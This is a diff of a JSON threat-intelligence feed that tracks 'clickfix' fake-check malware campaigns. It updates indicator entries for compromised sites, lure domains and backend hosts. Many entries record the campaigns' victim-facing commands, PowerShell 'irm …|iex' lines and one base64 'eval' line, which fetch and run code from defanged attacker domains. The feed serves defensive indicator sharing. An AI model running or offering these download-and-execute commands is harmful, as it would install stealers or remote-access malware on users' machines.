@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 5864,
+ "count": 5862,
  "indicators": [
   {
    "indicator": "06services.it",
@@ -2752,10 +2752,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "irm 'browse-login[.]info/[id]'|iex",
     "irm 'img-codes-cloude[.]info/[id]'|iex",
     "irm 'ncheck-brows[.]beer/[id]'|iex"
    ],
    "connects_to": [
+    "browse-login.info",
     "img-codes-cloude.info",
     "ncheck-brows.beer"
    ],
@@ -5074,10 +5076,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "irm 'browse-login[.]info/[id]'|iex",
     "irm 'img-codes-cloude[.]info/[id]'|iex",
     "irm 'ncheck-brows[.]beer/[id]'|iex"
    ],
    "connects_to": [
+    "browse-login.info",
     "img-codes-cloude.info",
     "ncheck-brows.beer"
    ],
@@ -8277,11 +8281,11 @@
     "ubbrobccheck20.cc"
    ],
    "lure_from": [
+    "tthcsslread21.cc",
+    "tlschssl22read.cc",
     "verifyidentrob01.cc",
     "govrobczxc.cc",
     "fudcomcheck.art",
-    "tthcsslread21.cc",
-    "tlschssl22read.cc",
     "fcdnbovres.cc",
     "webffoo001.cc",
     "webffoo002.cc"
@@ -12924,10 +12928,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "irm 'browse-login[.]info/[id]'|iex",
     "irm 'img-codes-cloude[.]info/[id]'|iex;",
     "irm 'ncheck-brows[.]beer/[id]'|iex"
    ],
    "connects_to": [
+    "browse-login.info",
     "img-codes-cloude.info",
     "ncheck-brows.beer"
    ],
@@ -52382,6 +52388,8 @@
     "escapeai.live",
     "cosmical2049.com",
     "45.158.199.240",
+    "91.108.240.168",
+    "duptruiisdusky.pro",
     "83.141.90.19",
     "stuststoaara-grove.pro"
    ],
@@ -52390,12 +52398,12 @@
     "interseq.at",
     "nikogdatakonebilo.cc",
     "mango-oyster.cfd",
+    "barabulkaaaa.org",
     "pizdalisibivet.org",
     "yaponovosh.org",
     "efreitorher.org",
     "biboiboboorl.org",
-    "yaebalciganovvjopu.org",
-    "ktoktotam.cc"
+    "yaebalciganovvjopu.org"
    ]
   },
   {
@@ -64491,11 +64499,12 @@
    "actor_link": null,
    "commands": [
     "irm 'cloud-browse[.]codes/[id]'|iex",
-    "irm 'img-codes-cloude[.]info/[id]'|iex",
-    "irm 'ncheck-brows[.]beer/[id]'|iex"
+    "irm 'browse-login[.]info/[id]'|iex",
+    "irm 'img-codes-cloude[.]info/[id]'|iex"
    ],
    "connects_to": [
     "cloud-browse.codes",
+    "browse-login.info",
     "img-codes-cloude.info",
     "ncheck-brows.beer",
     "jscdncloude.beer"
@@ -64505,8 +64514,7 @@
     "runtimerailbit.com",
     "servicestatlab.com",
     "id-verfied.boats",
-    "codes.caffe-img.com",
-    "codes.browse-cdn.beer"
+    "codes.caffe-img.com"
    ]
   },
   {
@@ -65623,65 +65631,6 @@
     "cf.api-web-point.sbs"
    ],
    "lure_from": []
-  },
-  {
-   "indicator": "champsperdrix.fr",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-10-17",
-   "last_seen": "2026-11-25",
-   "last_online": "2026-11-26",
-   "offline_since": null,
-   "url": "https://champsperdrix.fr/",
-   "brand": null,
-   "product": null,
-   "hosting": "OVHcloud",
-   "dns": "OVH",
-   "ip": "213.186.33.3",
-   "asn": "AS16276",
-   "org": "OVH OVH SAS, FR",
-   "country": "FR",
-   "ips": [
-    {
-     "ip": "213.186.33.3",
-     "asn": null,
-     "org": null,
-     "first_seen": "2026-10-17",
-     "last_seen": "2026-11-25"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "champsperdrix.fr",
-     "status": "online",
-     "first_seen": "2026-10-17",
-     "last_seen": "2026-11-25"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "irm 'id-verfied.boats/[id]'|iex;",
-    "irm 'jscdncloude[.]beer/[id]'|iex;",
-    "irm 'cloud-browse[.]codes/[id]'|iex;"
-   ],
-   "connects_to": [
-    "id-verfied.boats",
-    "jscdncloude.beer",
-    "cloud-browse.codes",
-    "ncheck-brows.beer",
-    "verifing-server.codes"
-   ],
-   "lure_from": [
-    "codes.caffe-img.com",
-    "codes.browse-cdn.beer",
-    "jjjducodes.beer",
-    "browse-cloud.codes"
-   ]
   },
   {
    "indicator": "chandigarhhenggcollege.rf.gd",
@@ -67396,7 +67345,8 @@
    "lure_from": [
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "browse-login.info"
    ]
   },
   {
@@ -68699,10 +68649,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "irm 'browse-login[.]info/[id]'|iex",
     "irm 'img-codes-cloude[.]info/[id]'|iex",
     "irm 'ncheck-brows[.]beer/[id]'|iex"
    ],
    "connects_to": [
+    "browse-login.info",
     "img-codes-cloude.info",
     "ncheck-brows.beer"
    ],
@@ -92598,10 +92550,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "irm 'browse-login[.]info/[id]'|iex",
     "irm 'img-codes-cloude[.]info/[id]'|iex",
     "irm 'ncheck-brows[.]beer/[id]'|iex"
    ],
    "connects_to": [
+    "browse-login.info",
     "img-codes-cloude.info",
     "ncheck-brows.beer"
    ],
@@ -99135,8 +99089,7 @@
     "t-trustrest.com",
     "j7tracker.gb.net",
     "github.pw",
-    "trek-72.com",
-    "xorados.com"
+    "trek-72.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -103405,11 +103358,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "irm 'browse-login[.]info/[id]'|iex",
     "irm 'img-codes-cloude[.]info/[id]'|iex",
-    "# Check Code: [id] _744b=06c398;eval \"$(printf '%s' '[encoded]'|base64 -d)\"",
-    "irm 'ncheck-brows[.]beer/[id]'|iex"
+    "# Check Code: [id] _ecfc=[id];eval \"$(printf '%s' '[encoded]'|base64 -d)\""
    ],
    "connects_to": [
+    "browse-login.info",
     "img-codes-cloude.info",
     "policysync.pro",
     "ncheck-brows.beer"
@@ -122905,11 +122859,11 @@
     "ubbrobccheck20.cc"
    ],
    "lure_from": [
+    "tthcsslread21.cc",
+    "tlschssl22read.cc",
     "verifyidentrob01.cc",
     "govrobczxc.cc",
     "fudcomcheck.art",
-    "tthcsslread21.cc",
-    "tlschssl22read.cc",
     "fcdnbovres.cc",
     "webffoo001.cc",
     "webffoo002.cc"
@@ -137304,10 +137258,10 @@
     "verifyidentrob01.cc"
    ],
    "lure_from": [
-    "govrobczxc.cc",
-    "fudcomcheck.art",
     "tthcsslread21.cc",
     "tlschssl22read.cc",
+    "govrobczxc.cc",
+    "fudcomcheck.art",
     "fcdnbovres.cc",
     "webffoo001.cc",
     "webffoo002.cc"
@@ -139565,9 +139519,9 @@
    ],
    "lure_from": [
     "ubbrobccheck20.cc",
-    "fudcomcheck.art",
     "tthcsslread21.cc",
     "tlschssl22read.cc",
+    "fudcomcheck.art",
     "fcdnbovres.cc",
     "webffoo001.cc",
     "webffoo002.cc"
@@ -155936,15 +155890,15 @@
    "commands": [
     "irm 'jscdncloude[.]beer/[id]'|iex;",
     "irm 'cloud-browse[.]codes/[id]'|iex;",
-    "irm 'img-codes-cloude[.]info/[id]'|iex"
+    "irm 'browse-login[.]info/[id]'|iex"
    ],
    "connects_to": [
     "jscdncloude.beer",
     "cloud-browse.codes",
+    "browse-login.info",
     "img-codes-cloude.info",
     "ncheck-brows.beer",
-    "id-verfied.boats",
-    "verifing-server.codes"
+    "id-verfied.boats"
    ],
    "lure_from": [
     "codes.caffe-img.com",
@@ -190714,17 +190668,17 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "irm 'browse-login[.]info/[id]'|iex",
     "irm 'img-codes-cloude[.]info/[id]'|iex",
-    "irm 'jscdncloude[.]beer/[id]'|iex;",
-    "irm 'cloud-browse[.]codes/[id]'|iex;"
+    "irm 'jscdncloude[.]beer/[id]'|iex;"
    ],
    "connects_to": [
+    "browse-login.info",
     "img-codes-cloude.info",
     "jscdncloude.beer",
     "cloud-browse.codes",
     "ncheck-brows.beer",
-    "id-verfied.boats",
-    "verifing-server.codes"
+    "id-verfied.boats"
    ],
    "lure_from": [
     "codes.caffe-img.com",
@@ -207786,15 +207740,15 @@
    "commands": [
     "irm 'jscdncloude[.]beer/[id]'|iex;",
     "irm 'cloud-browse[.]codes/[id]'|iex;",
-    "irm 'img-codes-cloude[.]info/[id]'|iex"
+    "irm 'browse-login[.]info/[id]'|iex"
    ],
    "connects_to": [
     "jscdncloude.beer",
     "cloud-browse.codes",
+    "browse-login.info",
     "img-codes-cloude.info",
     "ncheck-brows.beer",
-    "id-verfied.boats",
-    "verifing-server.codes"
+    "id-verfied.boats"
    ],
    "lure_from": [
     "codes.caffe-img.com",
@@ -211440,10 +211394,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "irm 'browse-login[.]info/[id]'|iex",
     "irm 'img-codes-cloude[.]info/[id]'|iex",
     "irm 'ncheck-brows[.]beer/[id]'|iex"
    ],
    "connects_to": [
+    "browse-login.info",
     "img-codes-cloude.info",
     "ncheck-brows.beer"
    ],
@@ -221078,15 +221034,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "irm 'browse-login[.]info/[id]'|iex",
     "irm 'ncheck-brows[.]beer/[id]'|iex",
-    "irm 'cloud-browse[.]codes/[id]'|iex",
-    "irm 'jscdncloude[.]beer/[id]'|iex"
+    "irm 'cloud-browse[.]codes/[id]'|iex"
    ],
    "connects_to": [
+    "browse-login.info",
     "ncheck-brows.beer",
     "cloud-browse.codes",
-    "jscdncloude.beer",
-    "verifing-server.codes"
+    "jscdncloude.beer"
    ],
    "lure_from": [
     "id-verfied.boats",
@@ -256987,10 +256943,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "irm 'browse-login[.]info/[id]'|iex;",
     "irm 'img-codes-cloude[.]info/[id]'|iex;",
     "irm 'ncheck-brows[.]beer/[id]'|iex;"
    ],
    "connects_to": [
+    "browse-login.info",
     "img-codes-cloude.info",
     "ncheck-brows.beer"
    ],
@@ -265439,15 +265397,15 @@
    "commands": [
     "irm 'jscdncloude[.]beer/[id]'|iex;",
     "irm 'cloud-browse[.]codes/[id]'|iex;",
-    "irm 'img-codes-cloude[.]info/[id]'|iex"
+    "irm 'browse-login[.]info/[id]'|iex"
    ],
    "connects_to": [
     "jscdncloude.beer",
     "cloud-browse.codes",
+    "browse-login.info",
     "img-codes-cloude.info",
     "ncheck-brows.beer",
-    "id-verfied.boats",
-    "verifing-server.codes"
+    "id-verfied.boats"
    ],
    "lure_from": [
     "codes.caffe-img.com",
@@ -267587,12 +267545,12 @@
     "verifyidentitypc.com",
     "jscdncloude.beer",
     "cloud-browse.codes",
+    "browse-login.info",
     "img-codes-cloude.info",
     "id-verfied.boats",
-    "verifing-server.codes",
     "ncheck-brows.beer",
-    "browse-login.info",
-    "codes.browse-cdn.beer"
+    "codes.browse-cdn.beer",
+    "verifing-server.codes"
    ],
    "lure_from": [
     "ncheck-brows.beer",
@@ -272782,19 +272740,19 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "irm 'browse-login[.]info/[id]'|iex",
     "irm 'img-codes-cloude[.]info/[id]'|iex",
-    "irm 'ncheck-brows[.]beer/[id]'|iex",
-    "irm 'jscdncloude[.]beer/[id]'|iex;"
+    "irm 'ncheck-brows[.]beer/[id]'|iex"
    ],
    "connects_to": [
     "dns-api.org",
     "id-dns.net",
+    "browse-login.info",
     "img-codes-cloude.info",
     "ncheck-brows.beer",
     "jscdncloude.beer",
     "cloud-browse.codes",
-    "id-verfied.boats",
-    "verifing-server.codes"
+    "id-verfied.boats"
    ],
    "lure_from": [
     "codes.caffe-img.com",
@@ -284778,8 +284736,7 @@
     "jscdncloude.beer",
     "cloud-browse.codes",
     "ncheck-brows.beer",
-    "id-verfied.boats",
-    "verifing-server.codes"
+    "id-verfied.boats"
    ],
    "lure_from": [
     "codes.caffe-img.com",
@@ -285385,7 +285342,8 @@
     "jscdncloude.beer",
     "cloud-browse.codes",
     "id-verfied.boats",
-    "verifing-server.codes"
+    "verifing-server.codes",
+    "browse-login.info"
    ],
    "lure_from": [
     "codes.caffe-img.com",
@@ -287637,14 +287595,14 @@
    "commands": [
     "irm 'jscdncloude[.]beer/[id]'|iex;",
     "irm 'cloud-browse[.]codes/[id]'|iex;",
-    "irm 'ncheck-brows[.]beer/[id]'|iex"
+    "irm 'browse-login[.]info/[id]'|iex"
    ],
    "connects_to": [
     "ncheck-brows.beer",
     "jscdncloude.beer",
     "cloud-browse.codes",
-    "id-verfied.boats",
-    "verifing-server.codes"
+    "browse-login.info",
+    "id-verfied.boats"
    ],
    "lure_from": [
     "codes.caffe-img.com",
@@ -290977,14 +290935,14 @@
    "commands": [
     "irm 'jscdncloude[.]beer/[id]'|iex;",
     "irm 'cloud-browse[.]codes/[id]'|iex;",
-    "irm 'ncheck-brows[.]beer/[id]'|iex"
+    "irm 'browse-login[.]info/[id]'|iex"
    ],
    "connects_to": [
     "ncheck-brows.beer",
     "jscdncloude.beer",
     "cloud-browse.codes",
-    "id-verfied.boats",
-    "verifing-server.codes"
+    "browse-login.info",
+    "id-verfied.boats"
    ],
    "lure_from": [
     "codes.caffe-img.com",
@@ -295851,10 +295809,10 @@
     "ubbrobccheck20.cc"
    ],
    "lure_from": [
-    "verifyidentrob01.cc",
-    "fudcomcheck.art",
     "tthcsslread21.cc",
     "tlschssl22read.cc",
+    "verifyidentrob01.cc",
+    "fudcomcheck.art",
     "fcdnbovres.cc",
     "webffoo001.cc",
     "webffoo002.cc"
@@ -301369,14 +301327,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "irm 'browse-login[.]info/[id]'|iex",
     "irm 'ncheck-brows[.]beer/[id]'|iex",
-    "irm 'cloud-browse[.]codes/[id]'|iex;",
-    "irm 'verifing-server[.]codes/[id]'|iex;"
+    "irm 'cloud-browse[.]codes/[id]'|iex;"
    ],
    "connects_to": [
+    "browse-login.info",
     "ncheck-brows.beer",
-    "cloud-browse.codes",
-    "verifing-server.codes"
+    "cloud-browse.codes"
    ],
    "lure_from": [
     "browse-cloud.codes",
@@ -303279,8 +303237,7 @@
     "cloud-browse.codes",
     "img-codes-cloude.info",
     "ncheck-brows.beer",
-    "id-verfied.boats",
-    "verifing-server.codes"
+    "id-verfied.boats"
    ],
    "lure_from": [
     "codes.caffe-img.com",
@@ -306941,15 +306898,15 @@
    "commands": [
     "irm 'jscdncloude[.]beer/[id]'|iex;",
     "irm 'cloud-browse[.]codes/[id]'|iex;",
-    "irm 'img-codes-cloude[.]info/[id]'|iex"
+    "irm 'browse-login[.]info/[id]'|iex"
    ],
    "connects_to": [
     "jscdncloude.beer",
     "cloud-browse.codes",
+    "browse-login.info",
     "img-codes-cloude.info",
     "ncheck-brows.beer",
-    "id-verfied.boats",
-    "verifing-server.codes"
+    "id-verfied.boats"
    ],
    "lure_from": [
     "codes.caffe-img.com",
@@ -310197,65 +310154,6 @@
    "lure_from": []
   },
   {
-   "indicator": "welderswelfare.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-18",
-   "last_seen": "2026-11-17",
-   "last_online": "2026-11-26",
-   "offline_since": null,
-   "url": "https://www.welderswelfare.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "GoDaddy",
-   "dns": "GoDaddy",
-   "ip": "184.168.107.47",
-   "asn": "AS26496",
-   "org": "AS-26496-GO-DADDY-COM-LLC - GoDaddy.com, LLC, US",
-   "country": "SG",
-   "ips": [
-    {
-     "ip": "184.168.107.47",
-     "asn": "AS26496",
-     "org": "AS-26496-GO-DADDY-COM-LLC - GoDaddy.com, LLC, US",
-     "first_seen": "2026-10-18",
-     "last_seen": "2026-11-17"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "www.welderswelfare.com",
-     "status": "online",
-     "first_seen": "2026-10-18",
-     "last_seen": "2026-11-17"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "irm 'jscdncloude[.]beer/[id]'|iex;",
-    "irm 'cloud-browse[.]codes/[id]'|iex;",
-    "irm 'ncheck-brows[.]beer/[id]'|iex"
-   ],
-   "connects_to": [
-    "jscdncloude.beer",
-    "cloud-browse.codes",
-    "ncheck-brows.beer",
-    "id-verfied.boats",
-    "verifing-server.codes"
-   ],
-   "lure_from": [
-    "codes.caffe-img.com",
-    "codes.browse-cdn.beer",
-    "jjjducodes.beer",
-    "browse-cloud.codes"
-   ]
-  },
-  {
    "indicator": "wellnessclarity.com",
    "type": "domain",
    "category": "clickfix",
@@ -312895,11 +312793,11 @@
     "verifyidentrob01.cc",
     "govrobczxc.cc",
     "fudcomcheck.art",
+    "tthcsslread21.cc",
+    "tlschssl22read.cc",
     "fcdnbovres.cc",
     "webffoo001.cc",
-    "webffoo002.cc",
-    "tthcsslread21.cc",
-    "tlschssl22read.cc"
+    "webffoo002.cc"
    ]
   },
   {
@@ -323494,10 +323392,10 @@
     "verifyidentrob01.cc"
    ],
    "lure_from": [
-    "govrobczxc.cc",
-    "fudcomcheck.art",
     "tthcsslread21.cc",
     "tlschssl22read.cc",
+    "govrobczxc.cc",
+    "fudcomcheck.art",
     "fcdnbovres.cc",
     "webffoo001.cc",
     "webffoo002.cc"
